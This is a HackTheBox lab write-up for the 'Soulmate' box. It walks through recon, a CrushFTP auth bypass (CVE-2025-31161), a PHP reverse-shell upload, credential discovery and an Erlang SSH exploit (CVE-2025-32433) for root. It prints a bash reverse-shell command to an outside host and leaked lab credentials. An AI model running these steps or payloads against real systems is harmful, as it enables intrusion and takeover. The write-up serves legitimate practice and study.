---
title: HackTheBox - Soulmate writeup (Linux/Easy)
categories: [HackTheBox]
tags: [HackTheBox, soulmate, nmap, http, ssh, ttl, nginx, php, fuff, vhost-enum, ftp, crushftp, auth-bypass, nuclei, CVE-2025-31161, php-rev-shell, penelope, erlang, nxc, nxc-ssh, ss, internal-service, internal-port, ssh-local-port-forward, CVE-2025-32433, ssh-erlang, nc]
render_with_liquid: false
---

`soulmate` is an easy `Linux` box running a `crushftp` instance vulnerable to `CVE-2025-31161` auth bypass, I took advantage of it to add a new superuser so I can upload a revshell and get a shell as `www-data`, from there I found `ben` credentials in a startup script, for the root part I found an internal service running an `ssh-Erlang` instance vulnerable to `CVE-2025-32433`  as root which I exploited to get root privs

## recon

I ran `nmap` on the host to find `http` and `ssh` running on the box, `TTLs` match expected values for open ports on `Linux` one hop away
```bash
$ nmap -vv -sCSV -oN soulmate 10.129.231.23
# Nmap 7.98 scan initiated Fri Feb 13 13:50:29 2026 as: nmap -vv -sCSV -oN soulmate 10.129.231.23
Nmap scan report for 10.129.52.31 (10.129.52.31)
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2025-09-09 01:14:13 +01 for 924s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

based on [0xdf OS enum cheatsheet](https://0xdf.gitlab.io/cheatsheets/os) the box appears to be running either `22.04 - jammy [LTS]`

the webserver is `nginx 1.18.0` and is redirecting to `http://soulmate.htb/` so I added that host to my `/etc/hosts` file
```bash
echo 10.129.231.23 soulmate.htb | sudo tee -a /etc/hosts
```

### Http enum
visiting the website on my browser, I found a matching app
![main_page.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/main_page.png)

the main page didn't have any interesting info, other than a button to register redirecting to `register.php`
![signed_up_page.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/signed_up_page.png)

after making an account and logging in, the only new page I got is the profile settings, where i can change profile info and update the profile picture
![profile_settings.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/profile_settings.png)

I played a bit with the upload feature, but I couldn't get anything out of it

bruteforcing using my cookie doesn't reveal any new/hidden files
```bash
$ ffuf -u http://soulmate.htb/FUZZ -b 'PHPSESSID=vmed9lg61h3m2j0j5admshj87j' -w $RAFT -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists-master/Discovery/Web-Content/raft-medium-files-lowercase.txt
 :: Header           : Cookie: PHPSESSID=vmed9lg61h3m2j0j5admshj87j
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

profile.php             [Status: 200, Size: 13049, Words: 6107, Lines: 247, Duration: 132ms]
index.php               [Status: 200, Size: 17116, Words: 6330, Lines: 308, Duration: 133ms]
login.php               [Status: 200, Size: 9021, Words: 3361, Lines: 181, Duration: 133ms]
register.php            [Status: 200, Size: 11574, Words: 4686, Lines: 241, Duration: 133ms]
logout.php              [Status: 200, Size: 8554, Words: 3167, Lines: 178, Duration: 129ms]
.                       [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 131ms]
:: Progress: [16244/16244] :: Job [1/1] :: 307 req/sec :: Duration: [0:00:58] :: Errors: 0 ::
```

however I was able to find a new subdomain via `vhost` enum
```bash
$ ffuf -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb' -w $DNS_S -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb
 :: Wordlist         : FUZZ: /opt/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 270ms]
:: Progress: [5000/5000] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

I added the new host to my `/etc/hosts` file
```bash
echo 10.129.231.23 ftp.soulmate.htb | sudo tee -a /etc/hosts
```

## user.txt

### Auth bypass 

that new hostname had a [crushftp](https://www.crushftp.com/index.html) instance asking for login credentials
![crushftp_login.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/crushftp_login.png)
I couldn't find any version nor I had any creds, so i ran `nuclei` on both vhosts, and found that `crushFTP` is vulnerable to `CVE-2025-31161`
```bash
$ nuclei -target ftp.soulmate.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.7.0

		projectdiscovery.io

...
[CVE-2025-31161] [http] [critical] http://ftp.soulmate.htb/WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=0817
```

`CVE-2025-31161` is an auth bypass vulnerability that results in creating a new super user, with the only prerequisite is knowing a valid username on the website, luckily in `crushFTP` there is a default `crushadmin` user, I used [this](https://github.com/Immersive-Labs-Sec/CVE-2025-31161) exploit to create a new admin account
```bash
$ python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user jeff --password jeff
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: jeff
   [*] Password: jeff
```

then I logged in with my new superuser
![crushftp_superuser_login.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/crushftp_superuser_login.png)

### Shell as www-data

I went to the admin panel (top left button), and it took me to another panel that had so many functionalities and was kinda confusing as hell 
![crushftp_admin_panel.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/crushftp_admin_panel.png)

I went to the user manager tab, and I found a list of website users
![crushftp_user_manager_tab.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/crushftp_user_manager_tab.png)

I clicked on `crushadmin` and checked out his ftp share
![crushftp_crushadmin_ftp_share.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/crushftp_crushadmin_ftp_share.png)

inside there was an `/app/webProd/` directory that contained the source code for the main website
![souce_code_files.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/souce_code_files.png)

I mapped the folder to my user files and gave me user permissions to upload, so I can upload a reverse shell via the ftp interface
![mapped_webprod_folder.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/mapped_webprod_folder.png)

now I can see the files when I go back to the `crushFTP` panel
![ftp_panel.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/soulmate/ftp_panel.png)

from here I uploaded a php reverse shell and visited `http://soulmate.htb/rev.php` and got a connection back as `www-data`
```bash
$ penelope.py -p 10000
...
www-data@soulmate:/$
```

### Shell as ben

examining the processes showed a readable script that is running as `root` 
```bash
root        1146       1  0 14:13 ?        00:00:03 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

inside that script I found `ben`'s credentials which worked for both `su` and ssh
```bash
$ www-data@soulmate:/$ grep ben /usr/local/lib/erlang_login/start.escript
        {user_passwords, [{"ben", "HouseH0ldings998"}]},
```

```bash
$ nxc ssh soulmate.htb -u ben -p HouseH0ldings998
SSH         10.129.2.55     22     soulmate.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.2.55     22     soulmate.htb     [+] ben:HouseH0ldings998  Linux - Shell access!
```

I logged in via `ssh` and got the flag
```bash
$ ssh ben@soulmate.htb
ben@soulmate.htb''s password:
Last login: Thu Feb 19 15:10:26 2026 from 10.10.14.105
ben@soulmate:~$ cat user.txt
eb****************************f4
```
## root.txt

I did some enum and I found a local service running on port 2222 that wasn't exposed
```bash
ben@soulmate:~$ ss -lntp
State           Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port          Process
LISTEN          0                4096                           127.0.0.1:8080                           0.0.0.0:*
LISTEN          0                4096                       127.0.0.53%lo:53                             0.0.0.0:*
LISTEN          0                128                            127.0.0.1:39321                          0.0.0.0:*
LISTEN          0                5                              127.0.0.1:2222                           0.0.0.0:*
LISTEN          0                4096                           127.0.0.1:8443                           0.0.0.0:*
LISTEN          0                4096                           127.0.0.1:9090                           0.0.0.0:*
LISTEN          0                4096                             0.0.0.0:4369                           0.0.0.0:*
LISTEN          0                4096                           127.0.0.1:39513                          0.0.0.0:*
LISTEN          0                128                              0.0.0.0:22                             0.0.0.0:*
LISTEN          0                511                              0.0.0.0:80                             0.0.0.0:*
LISTEN          0                4096                                [::]:4369                              [::]:*
LISTEN          0                128                                 [::]:22                                [::]:*
LISTEN          0                511                                 [::]:80                                [::]:*
```

grabbing the banner of the service using `nc` tells me that it's related to ssh as well its version
```bash
ben@soulmate:~$ nc localhost 2222
SSH-2.0-Erlang/5.2.9
```

I quickly found that the version is vulnerable to `CVE-2025-32433` so I ran the following command to perform a local port forward so I can access the internal port from my machine
```bash
ssh ben@soulmate.htb -L 2222:127.0.0.1:2222 -N
```

I checked that it's accessible now from my machine
```bash
$ nc -zv localhost 2222
Connection to localhost (::1) 2222 port [tcp/EtherNet-IP-1] succeeded!
$ nc localhost 2222
SSH-2.0-Erlang/5.2.9
```

then used [this PoC](https://github.com/0xPThree/cve-2025-32433) to get command execution as root and pop a rev shell
```bash
$ python cve-2025-32433.py
[*] Connecting to SSH server...
[✓] Banner: SSH-2.0-Erlang/5.2.9
[*] Sending KEXINIT...
[*] Opening channel...
[?] Shell command: bash -i >& /dev/tcp/10.10.14.105/20000 0>&1
[*] Sending CHANNEL_REQUEST...
[✓] Payload sent.
```

in my other terminal I got a connection back and got the root flag
```bash
$ penelope.py -p 20000
...
root@soulmate:/# cat /root/root.txt
50****************************53
```
